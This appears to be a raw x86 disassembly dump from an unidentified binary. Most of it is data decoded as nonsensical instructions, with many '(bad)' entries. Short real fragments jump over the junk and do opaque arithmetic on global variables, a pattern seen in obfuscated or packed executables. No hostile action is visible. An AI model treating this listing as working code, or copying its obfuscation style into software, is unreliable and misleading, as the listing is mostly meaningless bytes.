  40ce06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce07:	inc    edi
  40ce08:	ins    DWORD PTR es:[edi],dx
  40ce09:	jno    0x40ce15
  40ce0b:	ss je  0x40ce7a
  40ce0e:	js     0x40cda3
  40ce10:	movd   DWORD PTR [eax],mm3
  40ce13:	mov    al,0xbc
  40ce15:	(bad)  
  40ce16:	jp     0x40ce24
  40ce18:	cli    
  40ce19:	or     BYTE PTR [ebx+0x5e],bh
  40ce1c:	fist   DWORD PTR [edi+0x248f142]
  40ce22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce24:	leave  
  40ce25:	sti    
  40ce26:	inc    esp
  40ce27:	inc    esi
  40ce28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce29:	adc    ebp,ecx
  40ce2b:	mov    dh,0x5
  40ce2d:	xchg   ebp,eax
  40ce2e:	fwait
  40ce2f:	xchg   BYTE PTR [ebx],cl
  40ce31:	out    dx,eax
  40ce32:	ins    BYTE PTR es:[edi],dx
  40ce33:	mov    ds:0x9ce778ab,al
  40ce38:	xchg   ebp,eax
  40ce39:	mov    ebp,0x50554c98
  40ce3e:	jg     0x40cdf4
  40ce40:	push   0x564def0a
  40ce45:	push   ebx
  40ce46:	mov    ch,0xdf
  40ce48:	fidivr WORD PTR ds:0xdf7865de
  40ce4e:	(bad)  
  40ce4f:	xor    BYTE PTR [ecx],dl
  40ce51:	rol    DWORD PTR [ecx+ecx*2-0x7dd06b12],0x47
  40ce59:	add    eax,0xf0504f58
  40ce5e:	add    cl,BYTE PTR [edi-0x3aa7081]
  40ce64:	fldcw  WORD PTR [edi+eiz*1+0x12]
  40ce68:	fidivr DWORD PTR [esi+0x66]
  40ce6b:	int    0x78
  40ce6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce6e:	test   BYTE PTR [edi-0x337b01c6],dl
  40ce74:	es aaa 
  40ce76:	scas   al,BYTE PTR es:[edi]
  40ce77:	inc    ecx
  40ce78:	mov    bl,0x10
  40ce7a:	sub    al,0xea
  40ce7c:	xchg   ch,bl
  40ce7e:	add    esp,edi
  40ce80:	div    DWORD PTR [ebx+0x27]
  40ce83:	ds dec ebx
  40ce85:	sbb    cl,0xa8
  40ce88:	xchg   BYTE PTR [ebp+0x5d],ah
  40ce8b:	sbb    eax,ebp
  40ce8d:	popa   
  40ce8e:	sub    ah,BYTE PTR [edx+eiz*4+0x49]
  40ce92:	or     ch,BYTE PTR [ecx-0x4b27a44d]
  40ce98:	xor    ch,BYTE PTR ds:0x8cb250dd
  40ce9e:	jne    0x40ceae
  40cea0:	sbb    edi,ecx
  40cea2:	sbb    edx,DWORD PTR [eax]
  40cea4:	ret    0x90b6
  40cea7:	in     al,0x78
  40cea9:	cmp    DWORD PTR [esi],eax
  40ceab:	dec    ecx
  40ceac:	fadd   DWORD PTR [edx+0xbd05540]
  40ceb2:	mov    ds:0x4007f0cf,al
  40ceb7:	mov    ebx,0x48ef7ccb
  40cebc:	sar    ah,0x9b
  40cebf:	aaa    
  40cec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cec1:	push   0x4
  40cec3:	rcl    DWORD PTR [edi-0x40],0x95
  40cec7:	(bad)  
  40cec8:	hlt    
  40cec9:	or     DWORD PTR [edx-0x1afa3189],ebp
  40cecf:	pop    edi
  40ced0:	mov    al,0x5a
  40ced2:	aad    0x63
  40ced4:	fild   QWORD PTR [ecx]
  40ced6:	cdq    
  40ced7:	f2xm1  
  40ced9:	push   edi
  40ceda:	rcr    BYTE PTR [esi+0x70d59414],0xd3
  40cee1:	std    
  40cee2:	in     eax,0xf7
  40cee4:	pop    eax
  40cee5:	jns    0x40cf52
  40cee7:	pop    esi
  40cee8:	mov    ebp,0xd69b41cd
  40ceed:	scas   al,BYTE PTR es:[edi]
  40ceee:	push   es
  40ceef:	dec    ebp
  40cef0:	mov    ds,WORD PTR [ebp-0x1051bfd5]
  40cef6:	inc    edx
  40cef7:	xchg   edi,eax
  40cef8:	aad    0x67
  40cefa:	fistp  WORD PTR [esi]
  40cefc:	inc    edx
  40cefd:	dec    edi
  40cefe:	mov    esi,0x914b2d00
  40cf03:	inc    ebp
  40cf04:	add    al,0xc8
  40cf06:	mov    ds:0x5dd3f790,al
  40cf0b:	jecxz  0x40cf0b
  40cf0d:	outs   dx,BYTE PTR ds:[esi]
  40cf0e:	jp     0x40cf20
  40cf10:	or     edi,esi
  40cf12:	mov    edi,0x1384e035
  40cf17:	sbb    DWORD PTR [esi+0x72],esi
  40cf1a:	fwait
  40cf1b:	xchg   ebp,eax
  40cf1c:	or     esi,DWORD PTR [eax+0x73]
  40cf1f:	mov    dl,0x4b
  40cf21:	push   0x41
  40cf23:	adc    eax,0xfa350b7e
  40cf28:	mov    cl,0xce
  40cf2a:	dec    esp
  40cf2b:	cli    
  40cf2c:	out    0xaf,eax
  40cf2e:	sar    bl,1
  40cf30:	aad    0xf3
  40cf32:	cwde   
  40cf33:	ror    BYTE PTR [ecx+0x3c],0xc
  40cf37:	stos   BYTE PTR es:[edi],al
  40cf38:	adc    eax,DWORD PTR fs:[eax+0x30]
  40cf3c:	mov    ds:0xd5d7504b,eax
  40cf41:	js     0x40cf4e
  40cf43:	shl    DWORD PTR [esi+eax*1-0x530d2c7b],0x7d
  40cf4b:	cdq    
  40cf4c:	adc    DWORD PTR [edx],esp
  40cf4e:	jp     0x40cfae
  40cf50:	sbb    DWORD PTR [ecx+0x178ed4b2],0x4a
  40cf57:	lods   eax,DWORD PTR ds:[esi]
  40cf58:	xchg   ecx,eax
  40cf59:	xlat   BYTE PTR ds:[ebx]
  40cf5a:	fs cwde 
  40cf5c:	call   0x448:0x7ad517d3
  40cf63:	(bad)  
  40cf64:	lods   al,BYTE PTR ds:[esi]
  40cf65:	jle    0x40cf34
  40cf67:	mov    BYTE PTR [ebp+0x40],cl
  40cf6a:	sub    DWORD PTR [esi-0x50],eax
  40cf6d:	pop    edi
  40cf6e:	inc    edi
  40cf6f:	jle    0x40cf19
  40cf71:	jo     0x40cf48
  40cf73:	inc    edi
  40cf74:	fnstenv ds:0xe3f7124d
  40cf7a:	push   cs
  40cf7b:	mov    ds:0x368eaba2,al
  40cf80:	mov    ebx,eax
  40cf82:	enter  0x6b22,0x61
  40cf86:	adc    edx,ecx
  40cf88:	mov    ss,WORD PTR [esi+ebp*2+0x55840f15]
  40cf8f:	out    0xff,al
  40cf91:	(bad)  
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	xor    eax,0x2a0fb41e
  40cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0x7678787e
  40cfd7:	xor    al,BYTE PTR [edx-0x6b]
  40cfda:	pop    es
  40cfdb:	mov    edx,0x224f6fa5
  40cfe0:	ja     0x40cfda
  40cfe2:	adc    DWORD PTR [eax-0x6ae969df],ecx
  40cfe8:	push   ss
  40cfe9:	inc    edi
  40cfea:	les    ecx,FWORD PTR [edi+0x77e6e9a1]
  40cff0:	ja     0x40cff6
  40cff2:	shr    BYTE PTR [ebp+0x53],0x7d
  40cff6:	fwait
  40cff7:	dec    edi
  40cff8:	test   eax,0xfea6d47e
  40cffd:	jnp    0x40cfd1
  40cfff:	popaw  
  40d001:	cmp    edi,DWORD PTR [edx]
  40d003:	cmp    al,0xcc
  40d005:	mov    al,ds:0xdbc9a8c5
  40d00a:	xor    al,0xa8
  40d00c:	mov    ds:0x9216a569,eax
  40d011:	inc    edx
  40d012:	(bad)  
  40d013:	mov    bh,0x47
  40d015:	mov    ebp,0xf36e5e39
  40d01a:	test   al,0x25
  40d01c:	mov    cs,WORD PTR [edx+eax*4-0xb3bfa10]
  40d023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d024:	fst    QWORD PTR [ebp-0x795cab78]
  40d02a:	xchg   ebp,eax
  40d02b:	(bad)  
  40d02d:	test   al,0x8a
  40d02f:	scas   al,BYTE PTR es:[edi]
  40d030:	inc    edx
  40d031:	mov    edi,0xb51beaed
  40d036:	pusha  
  40d037:	pop    ds
  40d038:	(bad)  
  40d039:	xchg   edx,eax
  40d03a:	xor    DWORD PTR [edi+0x2a74eab4],eax
  40d040:	aam    0xfe
  40d042:	int3   
  40d043:	stc    
  40d044:	inc    ecx
  40d045:	aam    0x9d
  40d047:	jo     0x40cfdf
  40d049:	adc    dl,BYTE PTR [esi]
  40d04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d04c:	sub    DWORD PTR [ebp+0x6d],esp
  40d04f:	mov    dl,0x2b
  40d051:	or     al,0x4
  40d053:	jb     0x40d03d
  40d055:	ins    DWORD PTR es:[edi],dx
  40d056:	lea    edx,ds:0xdd9f640b
  40d05c:	adc    al,0xd4
  40d05e:	es test al,0x48
  40d061:	add    eax,0xbfb43e95
  40d066:	mov    bh,0xc
  40d068:	pusha  
  40d069:	pusha  
  40d06a:	mov    eax,0x29523484
  40d06f:	pop    ebx
  40d070:	pop    ss
  40d071:	mov    edi,0xbc96db2d
  40d076:	add    BYTE PTR [ecx+edx*1-0x21],al
  40d07a:	fist   DWORD PTR [ecx-0x77]
  40d07d:	popf   
  40d07e:	icebp  
  40d07f:	adc    BYTE PTR [edx-0x4787c980],al
  40d085:	sbb    ah,dl
  40d087:	or     esi,DWORD PTR [ebx]
  40d089:	mov    edx,0xa99b2a49
  40d08e:	sub    BYTE PTR [edi],cl
  40d090:	mov    dh,0x2e
  40d092:	out    0x5f,eax
  40d094:	sahf   
  40d095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d096:	jg     0x40d06d
  40d098:	test   al,0xd1
  40d09a:	mov    edx,0xcd52f18d
  40d09f:	icebp  
  40d0a0:	das    
  40d0a1:	stc    
  40d0a2:	test   eax,0x2cb2c7c3
  40d0a7:	jne    0x40d087
  40d0a9:	add    dh,bl
  40d0ab:	mov    edi,0xff9d6069
  40d0b0:	rcr    BYTE PTR [ecx+0x41ee1f67],0xca
  40d0b7:	in     al,0xec
  40d0b9:	add    ecx,DWORD PTR [ebx]
  40d0bb:	push   ecx
  40d0bc:	or     al,0xd
  40d0be:	and    dh,BYTE PTR [ebp+0x7d]
  40d0c1:	mov    ds:0x4b836bac,al
  40d0c6:	sbb    DWORD PTR [eax-0x11e5fb04],0x50
  40d0cd:	ds xchg ebp,eax
  40d0cf:	dec    edi
  40d0d0:	test   DWORD PTR [eax],esi
  40d0d2:	sbb    dl,BYTE PTR ds:0x6df326d8
  40d0d8:	sbb    esp,DWORD PTR [edi-0x7c490900]
  40d0de:	das    
  40d0df:	pop    eax
  40d0e0:	fcmovnb st,st(5)
  40d0e2:	pop    ds
  40d0e3:	int3   
  40d0e4:	push   esp
  40d0e5:	icebp  
  40d0e6:	mov    ebp,0x7674f026
  40d0eb:	mov    esi,0x6e4315c3
  40d0f0:	repnz push edi
  40d0f2:	jecxz  0x40d0c0
  40d0f4:	das    
  40d0f5:	sub    al,0xbc
  40d0f7:	xchg   DWORD PTR [eax],ebp
  40d0f9:	sti    
  40d0fa:	jmp    0x731c:0xae6e66d
  40d101:	test   eax,0x97585825
  40d106:	das    
  40d107:	daa    
  40d108:	adc    eax,DWORD PTR [ecx]
  40d10a:	iret   
  40d10b:	push   ss
  40d10c:	fnsave [ecx]
  40d10e:	bswap  esp
  40d110:	inc    ebx
  40d111:	rcl    BYTE PTR [ebx],0xdc
  40d114:	mov    DWORD PTR [edx+0x765196e9],edi
  40d11a:	(bad)  
  40d11c:	inc    eax
  40d11d:	jmp    0x1a70:0x92367d56
  40d124:	cmc    
  40d125:	stc    
  40d126:	ds adc eax,0xf4d6972e
  40d12c:	mov    ds:0x4f7f8643,al
  40d131:	mov    DWORD PTR [edi],eax
  40d133:	call   0xc1dab041
  40d138:	mov    eax,ds:0xb42ac612
  40d13d:	div    bl
  40d13f:	shr    BYTE PTR [esi-0x54],1
  40d142:	sbb    DWORD PTR [edx],0x54
  40d145:	(bad)  
  40d147:	adc    al,bh
  40d149:	jb     0x40d171
  40d14b:	inc    ecx
  40d14c:	xor    DWORD PTR [edx+0x382a335e],0x24
  40d153:	ins    DWORD PTR es:[edi],dx
  40d154:	ficomp WORD PTR [edi-0x27]
  40d157:	sub    eax,0x6fcd3836
  40d15c:	pusha  
  40d15d:	(bad)
  40d160:	retf   
  40d161:	cmp    esi,DWORD PTR [ecx+0x1bade230]
  40d167:	push   edx
  40d168:	pusha  
  40d169:	add    esi,eax
  40d16b:	pop    edi
  40d16c:	ins    DWORD PTR es:[edi],dx
  40d16d:	sbb    eax,0xc570c9e1
  40d172:	mov    cl,0x8a
  40d174:	test   eax,0x6d8e5e30
  40d179:	sbb    ah,BYTE PTR [edi-0x41]
  40d17c:	popf   
  40d17d:	iret   
  40d17e:	lahf   
  40d17f:	neg    DWORD PTR [edi]
  40d181:	mov    eax,0x716f683a
  40d186:	xchg   DWORD PTR [edi+0xa27f881],ecx
  40d18c:	or     DWORD PTR [esi-0x69],ebp
  40d18f:	sti    
  40d190:	push   es
  40d191:	inc    edi
  40d192:	inc    edi
  40d193:	rcl    DWORD PTR [ebx+0x12807888],0x86
  40d19a:	pop    esp
  40d19b:	cdq    
  40d19c:	push   ds
  40d19d:	iret   
  40d19e:	push   ecx
  40d19f:	pop    esp
  40d1a0:	cmp    bl,dl
  40d1a2:	and    eax,0xeb134b90
  40d1a7:	gs loope 0x40d1e6
  40d1aa:	ret    0xd002
  40d1ad:	aam    0x89
  40d1af:	outs   dx,DWORD PTR ds:[esi]
  40d1b0:	fimul  WORD PTR [edi+0x4d5eb5b5]
  40d1b6:	test   al,0x5a
  40d1b8:	js     0x40d1c8
  40d1ba:	dec    eax
  40d1bb:	mov    al,ds:0xd7a7b45d
  40d1c0:	idiv   ah
  40d1c2:	mov    bl,0x45
  40d1c4:	aas    
  40d1c5:	shl    BYTE PTR [ebx],cl
  40d1c7:	dec    eax
  40d1c8:	stc    
  40d1c9:	pop    ecx
  40d1ca:	mov    DWORD PTR [esi-0x7a63859d],ebp
  40d1d0:	loope  0x40d21b
  40d1d2:	xchg   ebx,eax
  40d1d3:	iret   
  40d1d4:	lods   eax,DWORD PTR ds:[esi]
  40d1d5:	fiadd  DWORD PTR [ebp-0x15]
  40d1d8:	sub    esp,ebx
  40d1da:	pop    ebp
  40d1db:	jnp    0x40d163
  40d1dd:	push   es
  40d1de:	out    dx,eax
  40d1df:	jnp    0x40d1bd
  40d1e1:	pop    eax
  40d1e2:	add    al,0xd0
  40d1e4:	mov    ecx,0x717aa828
  40d1e9:	cmp    ebx,esp
  40d1eb:	jae    0x40d1a2
  40d1ed:	cmp    DWORD PTR [ebx+0x3382ad27],ebx
  40d1f3:	mov    ecx,0x7ed0c4e0
  40d1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1f9:	in     eax,dx
  40d1fa:	repnz lahf 
  40d1fc:	mov    esi,0xae8f5fcf
  40d201:	cmp    ebx,DWORD PTR [ebx]
  40d203:	enter  0xa1cd,0x2e
  40d207:	outs   dx,BYTE PTR ds:[esi]
  40d208:	mov    edx,0xf63b6b9f
  40d20d:	in     eax,0xb5
  40d20f:	rcr    ebx,cl
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	fsub   QWORD PTR [ecx-0x27]
  40d2bc:	mov    ch,0xe7
  40d2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x5b78787e
  40d2c6:	jle    0x40d2ea
  40d2c8:	adc    BYTE PTR [ecx+ebx*8],ch
  40d2cb:	jbe    0x40d283
  40d2cd:	(bad)  
  40d2ce:	xchg   ecx,eax
  40d2cf:	or     cl,ch
  40d2d1:	inc    edi
  40d2d2:	mov    eax,ds:0x7ff2d48
  40d2d7:	dec    edi
  40d2d8:	fs in  eax,dx
  40d2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2db:	mov    esi,0x390c1ca3
  40d2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e1:	fidiv  DWORD PTR [eax]
  40d2e3:	mov    bh,0x68
  40d2e5:	pop    ds
  40d2e6:	scas   eax,DWORD PTR es:[edi]
  40d2e7:	push   edi
  40d2e8:	dec    ebp
  40d2e9:	sub    dl,BYTE PTR [edi]
  40d2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ec:	mov    eax,ds:0xb30d2542
  40d2f1:	push   ds
  40d2f2:	inc    edi
  40d2f3:	dec    edi
  40d2f4:	adc    BYTE PTR [ebp-0xa43c2dd],0x4
  40d2fb:	das    
  40d2fc:	or     al,0x64
  40d2fe:	inc    esi
  40d2ff:	xchg   BYTE PTR [eax+0x5b62f2dd],ah
  40d305:	mov    al,ds:0x6b696273
  40d30a:	add    ah,BYTE PTR [ebp+0x15450c83]
  40d310:	retf   
  40d311:	mov    bh,0xd7
  40d313:	cmp    dl,ch
  40d315:	push   eax
  40d316:	lods   al,BYTE PTR ds:[esi]
  40d317:	mov    BYTE PTR [eax-0xf43379c],dh
  40d31d:	test   DWORD PTR ds:0x2a0b642,eax
  40d323:	leave  
  40d324:	or     ecx,eax
  40d326:	push   ax
  40d328:	push   esi
  40d329:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d32b:	mov    dh,0xf2
  40d32d:	retf   0x5c7a
  40d330:	(bad)  
  40d331:	addr16 mov ecx,0xe1ac1aea
  40d337:	push   0xc3788ca6
  40d33c:	mov    ds:0xa555bf4f,al
  40d341:	push   es
  40d342:	mov    cl,0xfa
  40d344:	aam    0xf0
  40d346:	mov    BYTE PTR [ecx],dl
  40d348:	pusha  
  40d349:	ds cs sub dh,al
  40d34d:	sahf   
  40d34e:	or     bl,BYTE PTR [edx]
  40d350:	das    
  40d351:	sub    DWORD PTR [ecx+0x17],ecx
  40d354:	bound  ebp,QWORD PTR [ecx+ebp*4-0x47163e7]
  40d35b:	mov    ah,0x42
  40d35d:	sbb    eax,0x549ad4f0
  40d362:	ret    
  40d363:	(bad)  
  40d364:	js     0x40d325
  40d366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d367:	xchg   ebp,eax
  40d368:	xchg   ecx,eax
  40d369:	das    
  40d36a:	enter  0xabb3,0xca
  40d36e:	test   al,0xaf
  40d370:	mov    ah,0x6f
  40d372:	ds dec eax
  40d374:	pop    es
  40d375:	xchg   edx,eax
  40d376:	mov    eax,0xaa52174a
  40d37b:	clc    
  40d37c:	(bad)  
  40d37d:	adc    ebx,edi
  40d37f:	imul   edi,DWORD PTR [edi+0x1b],0xe27e1bce
  40d386:	sahf   
  40d387:	xchg   ebx,eax
  40d388:	xor    DWORD PTR [eax-0x52],esi
  40d38b:	or     ah,BYTE PTR [eax-0x42]
  40d38e:	mov    gs,WORD PTR [edi-0x60b6c442]
  40d394:	inc    ebx
  40d395:	xchg   ebp,eax
  40d396:	lods   eax,DWORD PTR ds:[esi]
  40d397:	inc    edx
  40d398:	bound  ebp,QWORD PTR [ecx-0x527c4dbe]
  40d39e:	test   al,0x1b
  40d3a0:	mov    al,ds:0x7e548537
  40d3a5:	inc    esp
  40d3a6:	dec    esp
  40d3a7:	jmp    0x4bcd:0xb7eea4f3
  40d3ae:	push   ebp
  40d3af:	or     al,0x64
  40d3b1:	sub    dl,BYTE PTR [esi-0x5da44f95]
  40d3b7:	jmp    0x40d3fb
  40d3b9:	xor    eax,0xc49e7d35
  40d3be:	adc    eax,0xe9f8d67d
  40d3c3:	(bad)  
  40d3c4:	dec    ebp
  40d3c5:	popa   
  40d3c6:	mov    esp,0x41e81cfc
  40d3cb:	push   edi
  40d3cc:	je     0x40d436
  40d3ce:	fimul  WORD PTR [edx-0x4f37bd16]
  40d3d4:	retf   0x4eee
  40d3d7:	sbb    BYTE PTR [esi-0x25e53a8c],cl
  40d3dd:	cmp    DWORD PTR [eax-0xf4e7dfd],0x25
  40d3e4:	pop    edx
  40d3e5:	mov    ecx,0xdf6b1468
  40d3ea:	iret   
  40d3eb:	jle    0x40d443
  40d3ed:	mov    bh,BYTE PTR [edi+eiz*4-0x6eb4bf9c]
  40d3f4:	ds scas al,BYTE PTR es:[edi]
  40d3f6:	outs   dx,BYTE PTR ds:[esi]
  40d3f7:	loopne 0x40d468
  40d3f9:	mov    bh,0xfe
  40d3fb:	xlat   BYTE PTR ds:[ebx]
  40d3fc:	jecxz  0x40d40f
  40d3fe:	push   0x60484739
  40d403:	(bad)  
  40d404:	ins    BYTE PTR es:[edi],dx
  40d405:	mov    ebp,0x24569919
  40d40a:	push   0x4604c158
  40d40f:	inc    edx
  40d410:	push   0x7d
  40d412:	add    dh,cl
  40d414:	mov    BYTE PTR [eax],ch
  40d416:	(bad)  
  40d417:	and    DWORD PTR [edi+eiz*2+0x57],edi
  40d41b:	(bad)  
  40d41c:	scas   al,BYTE PTR es:[edi]
  40d41d:	into   
  40d41e:	gs nop
  40d420:	ins    BYTE PTR es:[edi],dx
  40d421:	ret    
  40d422:	das    
  40d423:	fisttp WORD PTR [edi+0x1cf62961]
  40d429:	ret    
  40d42a:	xor    eax,0xf0dcdbb9
  40d42f:	xchg   DWORD PTR [esi+0x289dfc2f],ebx
  40d435:	sbb    eax,0x1b3a7e20
  40d43a:	and    DWORD PTR [ecx+0x4a9491dd],edi
  40d440:	addr16 ret 0x58d8
  40d444:	or     al,0xa5
  40d446:	xor    BYTE PTR [edi-0x4735d725],bl
  40d44c:	(bad)  
  40d44d:	sti    
  40d44e:	cwde   
  40d44f:	loopne 0x40d413
  40d451:	mov    ebx,0x30e4ff75
  40d456:	mov    al,0x6e
  40d458:	cdq    
  40d459:	push   eax
  40d45a:	ss out dx,al
  40d45c:	inc    edi
  40d45d:	stos   DWORD PTR es:[edi],eax
  40d45e:	mov    ch,0x75
  40d460:	enter  0xbb9a,0x3e
  40d464:	mov    WORD PTR [esi+0x60d9874d],?
  40d46a:	pop    ebp
  40d46b:	mov    esp,0xbd72a498
  40d470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d471:	adc    esi,DWORD PTR [ebp-0x4b24270f]
  40d477:	out    dx,al
  40d478:	jns    0x40d484
  40d47a:	and    ebp,ecx
  40d47c:	mov    edi,0xf88e954f
  40d481:	(bad)  
  40d482:	clc    
  40d483:	rcr    esp,cl
  40d485:	sub    ah,BYTE PTR [edi+0x8]
  40d488:	sbb    al,0xc0
  40d48a:	cmp    DWORD PTR [ebx+0x3a80840d],esi
  40d490:	aaa    
  40d491:	lods   eax,DWORD PTR ds:[esi]
  40d492:	or     al,0xfb
  40d494:	int3   
  40d495:	jle    0x40d420
  40d497:	xor    eax,0x8fa4168b
  40d49c:	mov    bl,0x99
  40d49e:	jmp    0x5f0e:0x9bceac42
  40d4a5:	xlat   BYTE PTR ds:[ebx]
  40d4a6:	or     al,0x1d
  40d4a8:	mov    edi,0xb6ff66c8
  40d4ad:	mov    cl,BYTE PTR [edx+0x2bee3a74]
  40d4b3:	sub    al,0x75
  40d4b5:	iret   
  40d4b6:	xchg   ah,dh
  40d4b8:	add    ah,BYTE PTR [ebx-0x6a]
  40d4bb:	mov    dl,0x3f
  40d4bd:	mov    dh,0x49
  40d4bf:	and    al,0x45
  40d4c1:	xchg   ebp,eax
  40d4c2:	sub    edi,DWORD PTR [edi-0x2e87f0ab]
  40d4c8:	pop    edx
  40d4c9:	pop    ds
  40d4ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4cb:	imul   BYTE PTR [edx+0x3041c6f2]
  40d4d1:	outs   dx,BYTE PTR ds:[esi]
  40d4d2:	jnp    0x40d54c
  40d4d4:	xchg   edx,eax
  40d4d5:	out    dx,eax
  40d4d6:	gs push ebx
  40d4d9:	sub    ecx,DWORD PTR ds:0xda898254
  40d4df:	retf   
  40d4e0:	rol    BYTE PTR [ebp+0x5516f54e],1
  40d4e6:	xchg   ebx,eax
  40d4e7:	jbe    0x40d560
  40d4e9:	mov    ds:0xe714597b,al
  40d4ee:	outs   dx,BYTE PTR ds:[esi]
  40d4ef:	mov    dh,0xff
  40d4f1:	mov    ds:0xd7583573,al
  40d4f6:	xor    ebp,DWORD PTR ds:0x6472c300
  40d4fc:	pop    ecx
  40d4fd:	add    eax,0x45c78fec
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	jo     0x40d580
  40d577:	push   esp
  40d578:	sbb    BYTE PTR [ebx+ebp*4+0x7e357878],bl
  40d57f:	js     0x40d5f9
  40d581:	sbb    BYTE PTR [edx+0x26929dce],ch
  40d587:	out    0x16,eax
  40d589:	js     0x40d56c
  40d58b:	enter  0x2f5f,0x2
  40d58f:	mov    ah,0x3c
  40d591:	pop    esi
  40d592:	adc    eax,0x433239cf
  40d597:	jmp    0xe246e45f
  40d59c:	fxch   st(5)
  40d59e:	cmp    al,0x1b
  40d5a0:	hlt    
  40d5a1:	inc    esp
  40d5a2:	mov    bl,0xd7
  40d5a4:	ret    
  40d5a5:	lock data16 aam 0xc2
  40d5a9:	lds    ecx,FWORD PTR [edx-0x7923d604]
  40d5af:	inc    ecx
  40d5b0:	adc    edx,ebx
  40d5b2:	mov    edx,DWORD PTR [ebx+0x4f3d4294]
  40d5b8:	fild   WORD PTR [edi-0x75]
  40d5bb:	aaa    
  40d5bc:	das    
  40d5bd:	aaa    
  40d5be:	jg     0x40d588
  40d5c0:	sbb    BYTE PTR [edx],al
  40d5c2:	ror    dl,cl
  40d5c4:	mov    al,0x24
  40d5c6:	xor    cl,BYTE PTR [edx-0x40]
  40d5c9:	je     0x40d5bb
  40d5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5cc:	lock jno 0x40d59f
  40d5cf:	or     eax,DWORD PTR [ebx-0x80]
  40d5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d3:	fstp   QWORD PTR [eax]
  40d5d5:	jmp    0x40d5bf
  40d5d7:	sub    al,bl
  40d5d9:	mov    DWORD PTR [ebp-0x13],edi
  40d5dc:	inc    edi
  40d5dd:	or     bl,BYTE PTR [ebx]
  40d5df:	xchg   edx,eax
  40d5e0:	pop    ebp
  40d5e1:	push   eax
  40d5e2:	inc    ebp
  40d5e3:	jg     0x40d644
  40d5e5:	aam    0x14
  40d5e7:	and    DWORD PTR [esi],0xd571d8f7
  40d5ed:	das    
  40d5ee:	cmp    ecx,esi
  40d5f0:	dec    edx
